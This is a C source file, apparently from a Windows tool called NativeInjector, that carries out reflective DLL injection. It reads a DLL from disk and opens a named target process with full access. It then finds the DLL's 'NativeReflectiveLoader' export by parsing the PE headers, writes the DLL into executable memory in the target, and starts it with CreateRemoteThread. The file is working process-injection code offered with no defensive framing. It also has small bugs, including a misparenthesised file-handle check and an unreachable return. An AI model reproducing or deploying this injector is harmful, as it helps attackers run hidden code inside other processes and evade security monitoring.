#include "NativeInjector.h"

BOOL ReadTargetFileW
(
	_In_ LPCWSTR PeName,
	_Out_ LPVOID* lpBuffer,
	_Out_ DWORD* nNumberOfBytesToRead
)

{

	HANDLE	hFile = NULL;
	BOOL	State = TRUE;
	DWORD	lpNumberOfBytesRead = 0;

	if (!PeName || !lpBuffer || !nNumberOfBytesToRead)
		return FALSE;

	if (!(hFile = CreateFileW(PeName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
	{
		PRINT_ERROR("CreateFileA");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[0x%p] Current File Handle", hFile);

	if (!(*nNumberOfBytesToRead = GetFileSize(hFile, NULL)) || *nNumberOfBytesToRead == INVALID_FILE_SIZE)
	{
		PRINT_ERROR("GetFileSize");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[%ld] Current File Size", *nNumberOfBytesToRead);

	if (!(*lpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *nNumberOfBytesToRead)) || *lpBuffer == NULL)
	{
		PRINT_ERROR("HeapAlloc");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[%ld] Allocated Bytes to Buffer", *nNumberOfBytesToRead);

	if (!ReadFile(hFile, *lpBuffer, *nNumberOfBytesToRead, &lpNumberOfBytesRead, NULL))
	{
		PRINT_ERROR("ReadFile");
		State = FALSE; goto _END_FUNC;
	}

	OKAY("Successfully Read File!");

_END_FUNC:

	if (hFile)
		CloseHandle(hFile);

	return State;

}

BOOL GetRemoteId
(
	_In_ LPCWSTR ProcName,
	_Out_ DWORD* PID,
	_Out_ HANDLE* hProcess
)

{

	BOOL			State = TRUE;
	BOOL			found = FALSE;
	HANDLE			hSnap = NULL;
	PROCESSENTRY32W pe32 = { 0 };

	pe32.dwSize = sizeof(pe32);

	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == NULL)
	{
		PRINT_ERROR("CreateToolhelp32Snapshot");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[0x%p] Acquired Handle to hSnap", hSnap);

	if (Process32FirstW(hSnap, &pe32))
	{
		do
		{
			if (_wcsicmp(pe32.szExeFile, ProcName) == 0)
			{
				*PID = pe32.th32ProcessID;

				*hProcess = OpenProcess(
					PROCESS_ALL_ACCESS,
					FALSE,
					pe32.th32ProcessID
				);

				if (*hProcess == NULL)
				{
					printf("OpenProcess failed: %lu\n", GetLastError());
					CloseHandle(hSnap);
					State = FALSE; goto _END_FUNC;
				}

				found = TRUE;
				break;
			}

		} while (Process32NextW(hSnap, &pe32));
	}

_END_FUNC:

	if (hSnap)
		CloseHandle(hSnap);

	return found;

	return State;

}

DWORD RvaOffset
(
	_In_ DWORD dwRva,
	_In_ UINT_PTR PeBaseAddress
)
{

	PIMAGE_SECTION_HEADER	pImgSection = NULL;
	PIMAGE_NT_HEADERS64		pImgNt = NULL;


	pImgNt = (PIMAGE_NT_HEADERS64)(PeBaseAddress + ((PIMAGE_DOS_HEADER)PeBaseAddress)->e_lfanew);
	if (pImgNt->Signature != IMAGE_NT_SIGNATURE)
		return 0;

	pImgSection = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pImgNt->OptionalHeader) + pImgNt->FileHeader.SizeOfOptionalHeader);

	for (int i = 0; i < pImgNt->FileHeader.NumberOfSections; i++)
	{

		if (dwRva >= pImgSection[i].VirtualAddress && dwRva < (pImgSection[i].VirtualAddress + pImgSection[i].Misc.VirtualSize))
			return (dwRva - pImgSection[i].VirtualAddress + pImgSection[i].PointerToRawData);

	}

	WARN("Couldn't convert RVA to file offset!");

	return 0;

}

DWORD GetReflectiveLdrOffset
(
	_In_ UINT_PTR ReflectiveLdrBuffer
)
{
	PIMAGE_NT_HEADERS64			pImgNt = NULL;
	PIMAGE_EXPORT_DIRECTORY		pImgExportDir = NULL;
	PDWORD						pdwFuncNameArray = NULL;
	PDWORD						pdwFuncAddressArray = NULL;
	PWORD						pdwFuncOrdinalArray = NULL;


	pImgNt = (PIMAGE_NT_HEADERS64)(ReflectiveLdrBuffer + ((PIMAGE_DOS_HEADER)ReflectiveLdrBuffer)->e_lfanew);
	if (pImgNt->Signature != IMAGE_NT_SIGNATURE)
		return 0;

	pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(ReflectiveLdrBuffer + RvaOffset(pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, ReflectiveLdrBuffer));
	pdwFuncNameArray = (PDWORD)(ReflectiveLdrBuffer + RvaOffset(pImgExportDir->AddressOfNames, ReflectiveLdrBuffer));
	pdwFuncAddressArray = (PDWORD)(ReflectiveLdrBuffer + RvaOffset(pImgExportDir->AddressOfFunctions, ReflectiveLdrBuffer));
	pdwFuncOrdinalArray = (PWORD)(ReflectiveLdrBuffer + RvaOffset(pImgExportDir->AddressOfNameOrdinals, ReflectiveLdrBuffer));

	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++)
	{

		PCHAR ExportedFunctionName = (PCHAR)(ReflectiveLdrBuffer + RvaOffset(pdwFuncNameArray[i], ReflectiveLdrBuffer));

		if (strcmp(ExportedFunctionName, "NativeReflectiveLoader") == 0)
		{
			DWORD functionRVA = pdwFuncAddressArray[pdwFuncOrdinalArray[i]];
			DWORD fileOffset = RvaOffset(functionRVA, ReflectiveLdrBuffer);

			return fileOffset;
		}

	}

	WARN("Could Not Resolve Reflective Loader Offset!");
	return 0;

}

BOOL InjectReflectiveDll
(
	_In_ HANDLE hProcess,
	_In_ DWORD ReflectiveFunctionOffset,
	_In_ PBYTE ReflectiveDllBuffer,
	_In_ DWORD ReflectiveDllSize
)
{

	PBYTE	pBuffer = NULL;
	SIZE_T	NumberOfBytesWritten = 0;
	HANDLE	hThread = NULL;
	DWORD	TID = 0;


	if (!(pBuffer = VirtualAllocEx(hProcess, NULL, ReflectiveDllSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE)) || pBuffer == NULL)
	{
		PRINT_ERROR("VirtualAllocEx");
		return FALSE;
	}

	INFO("Allocated %lu bytes at --> [0x%p]", ReflectiveDllSize, pBuffer);

	if (!WriteProcessMemory(hProcess, pBuffer, ReflectiveDllBuffer, ReflectiveDllSize, &NumberOfBytesWritten))
	{
		PRINT_ERROR("WriteProcessMemory");
		return FALSE;
	}

	INFO("Wrote %zu of %lu bytes", NumberOfBytesWritten, ReflectiveDllSize);

	if (!(hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(pBuffer + ReflectiveFunctionOffset), NULL, 0, &TID)) || hThread == NULL)
	{
		PRINT_ERROR("CreateRemoteThread");
		return FALSE;
	}

	INFO("Reflective Function Offset --> [0x%p]", ReflectiveFunctionOffset);
	INFO("Creating New Thread --> [0x%p]", (PVOID)(pBuffer + ReflectiveFunctionOffset));

	INFO("Executed Reflective Loader!");

	CloseHandle(hThread);

	return TRUE;

}